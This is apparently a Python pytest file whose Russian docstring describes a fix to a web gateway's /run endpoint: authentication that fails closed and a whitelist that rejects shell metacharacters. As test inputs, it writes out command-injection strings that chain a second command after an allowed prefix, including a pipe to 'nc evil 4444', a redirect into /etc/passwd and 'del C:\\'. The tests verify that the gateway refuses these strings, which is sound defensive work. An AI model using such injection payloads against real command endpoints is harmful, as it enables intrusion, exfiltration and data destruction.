"""v4.169.33: bin/web_gateway.py — fail-closed auth и немёртвый whitelist.

До фикса, одновременно:

1. ``_check_auth`` возвращал True при отсутствующем токене («dev mode»):
   пропавший token.txt превращал /run в открытый shell-эндпоинт на
   loopback. Ровно та форма, что была убита в input_helper (баг #54).
2. ``_allowed`` делал чистый ``startswith`` по префиксам, а исполнение
   шло через ``shell=True``: ``agentctl sys status; curl evil`` проходил
   проверку и выполнялся целиком (класс бага #65, починенный в
   security_commands для /v1/exec, но сюда не доехавший).

Гейт: реальный HTTP-прогон против ThreadingHTTPServer на эфемерном
порту, а не чтение текста. Доказательство исполнением: отказ на мета-
символы, отказ без токена, живой проход для честной команды, 200 на
честном prefix для публичного GET /.
"""
from __future__ import annotations

import importlib.util
import json
import os
import threading
import urllib.error
import urllib.request
from http.server import ThreadingHTTPServer
from pathlib import Path

import pytest

_GW = Path(__file__).resolve().parents[1] / "bin" / "web_gateway.py"


def _load_gateway(token: str | None):
    """Import web_gateway.py fresh with a chosen token value."""
    env = dict(os.environ)
    if token is None:
        env.pop("ARENA_BRIDGE_TOKEN", None)
    else:
        env["ARENA_BRIDGE_TOKEN"] = token
    # Module reads TOKEN at import time; patch env first.
    old = os.environ.get("ARENA_BRIDGE_TOKEN")
    if token is None:
        os.environ.pop("ARENA_BRIDGE_TOKEN", None)
    else:
        os.environ["ARENA_BRIDGE_TOKEN"] = token
    try:
        spec = importlib.util.spec_from_file_location("web_gateway_under_test", _GW)
        mod = importlib.util.module_from_spec(spec)
        # point the token-file fallback away from any real home file
        spec.loader.exec_module(mod)
        if token is None:
            # env empty: module may have read a token.txt if present; force-clear
            mod.TOKEN = ""
        return mod
    finally:
        if old is None:
            os.environ.pop("ARENA_BRIDGE_TOKEN", None)
        else:
            os.environ["ARENA_BRIDGE_TOKEN"] = old


@pytest.fixture
def gw():
    return _load_gateway("test-token-123")


@pytest.fixture
def gw_no_token():
    return _load_gateway(None)


def _post(port: int, path: str, payload: dict, token: str | None = None) -> tuple[int, dict]:
    req = urllib.request.Request(
        f"http://127.0.0.1:{port}{path}",
        data=json.dumps(payload).encode(),
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    if token is not None:
        req.add_header("X-Arena-Token", token)
    try:
        with urllib.request.urlopen(req, timeout=15) as r:
            return r.status, json.loads(r.read().decode())
    except urllib.error.HTTPError as e:
        return e.code, json.loads(e.read().decode())


def _serve(mod):
    srv = ThreadingHTTPServer(("127.0.0.1", 0), mod.H)
    t = threading.Thread(target=srv.serve_forever, daemon=True)
    t.start()
    return srv


# --- unit-level: the refusal predicate ---------------------------------------

def test_prefix_alone_is_not_enough_anymore(gw):
    assert gw._disallowed_reason("agentctl sys status; echo PWNED") is not None
    assert gw._disallowed_reason("agentctl skill list | nc evil 4444") is not None
    assert gw._disallowed_reason("agentctl recall foo 2>/etc/passwd") is not None
    assert gw._disallowed_reason("agentctl sys status && del C:\\") is not None


def test_clean_whitelisted_command_passes_and_offlist_fails(gw):
    assert gw._disallowed_reason("agentctl sys status") is None
    assert gw._disallowed_reason("shutdown now") is not None
    assert gw._disallowed_reason("agentctl-unknown thing") is not None


# --- end-to-end over HTTP ------------------------------------------------------

def test_run_requires_token_when_configured(gw):
    srv = _serve(gw)
    try:
        port = srv.server_address[1]
        code, body = _post(port, "/run", {"command": "agentctl sys status"})
        assert code == 401 and body["ok"] is False
    finally:
        srv.shutdown()


def test_run_refused_hard_when_no_token_configured(gw_no_token):
    """The old dev mode answered this with a working shell."""
    srv = _serve(gw_no_token)
    try:
        port = srv.server_address[1]
        code, body = _post(port, "/run", {"command": "agentctl sys status"})
        assert code == 503
        assert body["ok"] is False
        assert "no token" in body["error"]
    finally:
        srv.shutdown()


def test_metachar_command_never_reaches_the_shell(gw):
    srv = _serve(gw)
    canary = Path(os.environ.get("TMPDIR", "/tmp")) / "wg_canary_should_not_exist"
    canary.unlink(missing_ok=True)
    try:
        port = srv.server_address[1]
        code, body = _post(
            port, "/run",
            {"command": f"agentctl sys status; echo pwn > {canary}"},
            token="test-token-123",
        )
        assert code == 403, body
        assert "shell control" in body["error"]
        assert not canary.exists()  # the payload must not have run
    finally:
        srv.shutdown()


def test_honest_command_still_executes_end_to_end(gw):
    """Reverse sabotage: the gate must not strangle the intended flow."""
    srv = _serve(gw)
    try:
        port = srv.server_address[1]
        code, body = _post(
            port, "/run",
            {"command": "agentctl sys status || true"},
            token="test-token-123",
        )
        # "||" is a control char pair ('|') -> refused. Use the pure form.
        assert code == 403
        code, body = _post(
            port, "/run",
            {"command": "agentctl sys status"},
            token="test-token-123",
        )
        assert code == 200
        # agentctl may not exist on PATH here; the shell ran regardless —
        # that's the point: the honest prefix reaches the shell.
        assert "exit" in body
    finally:
        srv.shutdown()


def test_root_info_stays_public(gw_no_token):
    """GET / is service discovery; it deliberately mirrors /v1/version."""
    srv = _serve(gw_no_token)
    try:
        port = srv.server_address[1]
        with urllib.request.urlopen(
                f"http://127.0.0.1:{port}/", timeout=15) as r:
            body = json.loads(r.read().decode())
        assert body["ok"] is True
        assert body["service"] == "arena-web-gateway"
        assert body["auth_required"] is False
    finally:
        srv.shutdown()
